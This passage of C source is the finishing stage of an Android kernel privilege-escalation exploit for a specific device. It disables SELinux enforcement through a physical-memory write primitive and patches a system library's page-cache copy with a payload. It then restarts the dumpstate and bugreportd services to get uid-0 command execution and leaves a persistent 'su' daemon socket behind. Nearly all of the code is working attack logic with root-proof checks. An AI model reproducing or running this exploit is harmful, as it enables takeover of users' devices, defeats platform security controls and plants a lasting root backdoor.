    "/system/bin/getenforce; /system/bin/dmesg 2>&1 | "
    "/system/bin/grep -i -m 8 'phys.*offset\\|PHYS_OFFSET'; "
    "echo PD2241_ROOT_END");
  printf("DUMPSTATE_ROOT_PROOF\n%s\n", root ? root : "<missing>");
  int root_ok = root && strstr(root, "uid=0(root)") &&
                strstr(root, "PD2241_ROOT_BEGIN") &&
                strstr(root, "PD2241_ROOT_END");
  free(root);
  if (!root_ok) {
    printf("RESULT FAIL dumpstate_root_channel\n");
    return 1;
  }

  uint64_t selinux_target = SELINUX_ENFORCING_DIRECT_ALIAS;
  uint64_t expected = P0_PAGE_OFFSET +
    (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET) + SELINUX_ENFORCING_IMAGE_OFF;
  printf("DIRECT_MAP_PROFILE base=0x%016llx phys_offset=0x%llx "
         "phys_load=0x%llx image_offset=0x%llx target=0x%016llx "
         "formula_match=%d source=exact_boot_profile\n",
         (unsigned long long)P0_PAGE_OFFSET,
         (unsigned long long)P0_PHYS_OFFSET,
         (unsigned long long)P0_KERNEL_PHYS_LOAD,
         (unsigned long long)SELINUX_ENFORCING_IMAGE_OFF,
         (unsigned long long)selinux_target, selinux_target == expected);
  if (selinux_target != expected || !is_direct_ptr(selinux_target) ||
      ep43074_redirect(true, selinux_target) != 0 ||
      ep43074_read_enforcing() != 0) {
    printf("RESULT FAIL selinux_zero target=0x%016llx enforcing=%d\n",
           (unsigned long long)selinux_target, ep43074_read_enforcing());
    return 1;
  }
  printf("SELINUX_AFTER Permissive target=0x%016llx\n",
         (unsigned long long)selinux_target);

  unlink(TARGET_SU_SOCKET);
  (void)ep43074_trigger_service(TARGET_BUGREPORTD_SERVICE, "ctl.stop");
  if (ep43074_trigger_service(TARGET_BUGREPORTD_SERVICE, "ctl.start") != 0) {
    printf("RESULT FAIL bugreportd_trigger\n");
    return 1;
  }
  char *su = ep43074_su_command(
    "echo PD2241_SU_BEGIN; /system/bin/id; /system/bin/id -Z; "
    "/system/bin/getenforce; echo PD2241_SU_END");
  printf("BUGREPORTD_SU_PROOF\n%s\n", su ? su : "<missing>");
  int su_ok = su && strstr(su, "uid=0(root)") &&
              strstr(su, "PD2241_SU_BEGIN") &&
              strstr(su, "PD2241_SU_END");
  free(su);
  printf("ROOT_SUMMARY route=%s dumpstate_uid0=1 selinux=Permissive "
         "bugreportd_su=%d vr_shell_cred_write=0 su_path=%s socket=%s\n",
         TARGET_ROUTE_REVISION, su_ok, TARGET_SU_CARRIER_PATH,
         TARGET_SU_SOCKET);
  printf("RESULT %s pd2241_5.15_43074_full\n", su_ok ? "PASS" : "FAIL");
  return su_ok ? 0 : 1;
}

/*
 * GhostLock finish: SELinux already Permissive + pipe physrw live.
 * Dirty-pipe carrier via physrw CAN_MERGE (no late_refs / 43074).
 * Shell uid stays 2000; root is bugreportd→su socket.
 */
int pd2241_bugreportd_su_finish(int cfg_fd) {
  const size_t carrier_size =
      (size_t)(pd2241_dumpstate_payload_end - pd2241_dumpstate_payload_start);
  struct ep43074_carrier carrier;
  int preflight_only = env_flag("BUGREPORTD_SU_PREFLIGHT", 0);
  int enforcing = ep43074_read_enforcing();

  printf("TRACE route=%s stage=bugreportd_su_finish enforcing=%d "
         "cfg_fd=%d payload=%zu preflight_only=%d backend=pagemap_physrw\n",
         TARGET_ROUTE_REVISION, enforcing, cfg_fd, carrier_size,
         preflight_only);
  fflush(stdout);

  if (cfg_fd < 0 || !physrw_read_ok || !physrw_write_ok) {
    printf("RESULT FAIL finish_prereq physrw_r=%d physrw_w=%d cfg_fd=%d\n",
           physrw_read_ok, physrw_write_ok, cfg_fd);
    return 1;
  }
  if (enforcing != 0) {
    printf("RESULT FAIL finish_selinux want=Permissive got=%d "
           "(GhostLock must clear enforcing first; readback only here)\n",
           enforcing);
    return 1;
  }
  if (carrier_size < 64 || carrier_size > 1024) {
    printf("RESULT FAIL finish_payload size=%zu\n", carrier_size);
    return 1;
  }

  /*
   * Default: pinned libdumpstateaidl.so (43499 profile). Permissive may make
   * /system/bin/dumpstate readable — that path is opt-in via CARRIER_ALLOW_DUMPSTATE=1
   * because its ctor/preimage differ from the pinned DSO anchors.
   */
  if (!selected_carrier_ready ||
      !ep43074_revalidate_carrier(&selected_carrier)) {
    printf("RESULT FAIL finish_carrier_runtime_gate\n");
    return 1;
  }
  carrier = selected_carrier;
  printf("CARRIER_SELECTED source=%s path=%s patch=0x%llx sha256=%s\n",
         carrier.source, carrier.path,
         (unsigned long long)carrier.patch_offset, carrier.sha256);

  /* Pinned 43499 anchors — reject silent 6.12 carry-over when using aidl. */
  {
    int fd = open(carrier.path, O_RDONLY | O_CLOEXEC);
    unsigned char pre[16] = {0};
    struct stat st = {0};
    if (fd < 0 || fstat(fd, &st) != 0) {
      printf("RESULT FAIL finish_carrier_stat path=%s errno=%d\n",
             carrier.path, errno);
      if (fd >= 0) close(fd);
      return 1;
    }
    int pre_ok =
        pread(fd, pre, sizeof(pre), carrier.patch_offset) == (ssize_t)sizeof(pre);
    close(fd);
    printf("CARRIER_PREFLIGHT path=%s size=0x%llx patch=0x%llx sha256=%s "
           "preimage=",
           carrier.path, (unsigned long long)st.st_size,
           (unsigned long long)carrier.patch_offset, carrier.sha256);
    for (size_t i = 0; i < sizeof(pre); i++) printf("%02x", pre[i]);
    printf(" pre_ok=%d\n", pre_ok);
    fflush(stdout);
    if (!pre_ok) {
      printf("RESULT FAIL finish_carrier_preimage_read\n");
      return 1;
    }
    if (memcmp(pre, carrier.preimage, sizeof(pre)) != 0) {
      printf("RESULT FAIL finish_carrier_preimage_mismatch\n");
      return 1;
    }
  }

  (void)ep43074_log_service_state(TARGET_DUMPSTATE_SERVICE);
  (void)ep43074_log_service_state(TARGET_BUGREPORTD_SERVICE);

  if (preflight_only) {
    printf("RESULT PASS bugreportd_su_preflight_only\n");
    return 0;
  }

  if (!prepare_embedded_su_carrier()) {
    printf("RESULT FAIL finish_prepare su errno=%d\n", errno);
    return 1;
  }

  /*
   * Stable path: physrw into the mmap'd page-cache page (pagemap PFN).
   * Do NOT prepare_pipe_buffer_page/reset_pipe_attempt here — that second
   * reclaim + dirty-pipe path caused mark_mergeable=0 and kernel_panic.
   */
  {
    unsigned char preimage[16];
    int pfd = open(carrier.path, O_RDONLY | O_CLOEXEC);
    if (pfd < 0 ||
        pread(pfd, preimage, sizeof(preimage), carrier.patch_offset) !=
            (ssize_t)sizeof(preimage)) {
      if (pfd >= 0) close(pfd);
      printf("RESULT FAIL finish_preimage_reload\n");
      return 1;
    }
    close(pfd);
    printf("TRACE route=%s stage=finish_physrw_patch path=%s off=0x%llx "
           "len=%zu\n",
           TARGET_ROUTE_REVISION, carrier.path,
           (unsigned long long)carrier.patch_offset, carrier_size);
    fflush(stdout);
    if (!physrw_patch_file_page(cfg_fd, carrier.path, carrier.patch_offset,
                                pd2241_dumpstate_payload_start, carrier_size,
                                preimage, sizeof(preimage))) {
      printf("RESULT FAIL finish_physrw_patch errno=%d\n", errno);
      return 1;
    }
  }
  printf("RESULT PASS finish_physrw_patch patch=0x%llx\n",
         (unsigned long long)carrier.patch_offset);

  /* Bootstrap: dumpstatez constructor serves /dev/socket/dumpstate as uid0. */
  (void)ep43074_trigger_service(TARGET_DUMPSTATE_SERVICE, "ctl.stop");
  if (ep43074_trigger_service(TARGET_DUMPSTATE_SERVICE, "ctl.start") != 0) {
    printf("RESULT FAIL finish_dumpstatez_trigger\n");
    return 1;
  }
  char *root = ep43074_dumpstate_command(
      "echo PD2241_ROOT_BEGIN; /system/bin/id; /system/bin/id -Z; "
      "/system/bin/getenforce; /system/bin/cat /proc/self/status; "
      "echo PD2241_ROOT_END");
  printf("DUMPSTATE_ROOT_PROOF\n%s\n", root ? root : "<missing>");
  char *root_caps = root ? strstr(root, "CapEff:") : NULL;
  unsigned long long root_cap_eff =
      root_caps ? strtoull(root_caps + strlen("CapEff:"), NULL, 16) : 0;
  int root_ok = root && strstr(root, "uid=0(root)") && root_cap_eff != 0 &&
                 strstr(root, "PD2241_ROOT_BEGIN") &&
                strstr(root, "PD2241_ROOT_END") &&
                strstr(root, TARGET_CARRIER_CONTEXT);
  free(root);
  if (!root_ok) {
    printf("RESULT FAIL finish_dumpstatez_proof context=%s\n",
           TARGET_CARRIER_CONTEXT);
    return 1;
  }

  enforcing = ep43074_read_enforcing();
  printf("SELINUX_READBACK enforcing=%d (no rewrite; already Permissive)\n",
         enforcing);
  if (enforcing != 0) {
    printf("RESULT FAIL finish_selinux_readback\n");
    return 1;
  }

  unlink(TARGET_SU_SOCKET);
  (void)ep43074_trigger_service(TARGET_BUGREPORTD_SERVICE, "ctl.stop");
  if (ep43074_trigger_service(TARGET_BUGREPORTD_SERVICE, "ctl.start") != 0) {
    printf("RESULT FAIL finish_bugreportd_trigger\n");
    return 1;
  }

  /* Peer gate before command body. */
  {
    int sfd = ep43074_connect(TARGET_SU_SOCKET, 25);
    if (sfd < 0) {
      printf("RESULT FAIL finish_su_socket errno=%d "
             "(carrier not loaded / domain / init — not VR)\n",
             errno);
      return 1;
    }
    struct ucred cred;
    socklen_t cred_len = sizeof(cred);
    char peersec[128] = {0};
    socklen_t sec_len = sizeof(peersec);
    memset(&cred, 0, sizeof(cred));
    int cred_ok = getsockopt(sfd, SOL_SOCKET, SO_PEERCRED, &cred, &cred_len) == 0;
#ifndef SO_PEERSEC
#define SO_PEERSEC 31
#endif
    int sec_ok =
        getsockopt(sfd, SOL_SOCKET, SO_PEERSEC, peersec, &sec_len) == 0;
    if (sec_ok && sec_len > 0 && sec_len < sizeof(peersec) &&
        peersec[sec_len - 1] != '\0') {
      peersec[sec_len] = '\0';
    }
    printf("SU_PEER cred_ok=%d uid=%u gid=%u pid=%d sec_ok=%d peersec=%s "
           "want=%s\n",
           cred_ok, cred.uid, cred.gid, cred.pid, sec_ok,
           sec_ok ? peersec : "<missing>", TARGET_CARRIER_CONTEXT);
    close(sfd);
    if (!cred_ok || cred.uid != 0 || cred.gid != 0 || !sec_ok ||
        !strstr(peersec, "dumpstate")) {
      printf("RESULT FAIL finish_su_peer\n");
      return 1;
    }
  }

  char *su = ep43074_su_command(
      "echo PD2241_SU_BEGIN; /system/bin/id; /system/bin/id -Z; "
      "/system/bin/getenforce; /system/bin/cat /proc/self/status; "
      "echo PD2241_SU_END");
  printf("BUGREPORTD_SU_PROOF\n%s\n", su ? su : "<missing>");
  char *su_caps = su ? strstr(su, "CapEff:") : NULL;
  unsigned long long su_cap_eff =
      su_caps ? strtoull(su_caps + strlen("CapEff:"), NULL, 16) : 0;
  int su_ok = su && strstr(su, "uid=0(root)") && su_cap_eff != 0 &&
              strstr(su, "PD2241_SU_BEGIN") &&
              strstr(su, "PD2241_SU_END") &&
              strstr(su, TARGET_CARRIER_CONTEXT);
  free(su);
  if (su_ok) {
    /*
     * Do NOT ctl.stop bugreportd: payload execve()'d into su --daemon in that
     * service PID; stopping it kills the daemon and leaves a stale socket
     * (connect → Connection refused). Only stop dumpstatez, then restore the
     * carrier page so later bugreportd restarts are clean.
     */
    (void)ep43074_trigger_service(TARGET_DUMPSTATE_SERVICE, "ctl.stop");
    int restored = physrw_restore_last_file_page(cfg_fd);
    printf("TRACE route=%s stage=finish_restore_carrier restored=%d "
           "(bugreportd left running as su --daemon)\n",
           TARGET_ROUTE_REVISION, restored);
    fflush(stdout);
  }
  printf("ROOT_SUMMARY route=%s dumpstate_uid0=1 selinux=Permissive "
         "bugreportd_su=%d vr_shell_cred_write=0 shell_uid=%u su_path=%s "
         "socket=%s context=%s\n",
         TARGET_ROUTE_REVISION, su_ok, getuid(), TARGET_SU_CARRIER_PATH,
         TARGET_SU_SOCKET, TARGET_CARRIER_CONTEXT);
  printf("RESULT %s pd2241_bugreportd_su_finish\n", su_ok ? "PASS" : "FAIL");
  return su_ok ? 0 : 1;
}

int pd2241_late_refs_pipe(uint64_t pipe_page) {
  (void)pipe_page;
  errno = ENOTSUP;
  return 1;
}

int pd2241_late_refs_zero(uint64_t target_byte) {
  (void)target_byte;
  errno = ENOTSUP;
  return 1;
}
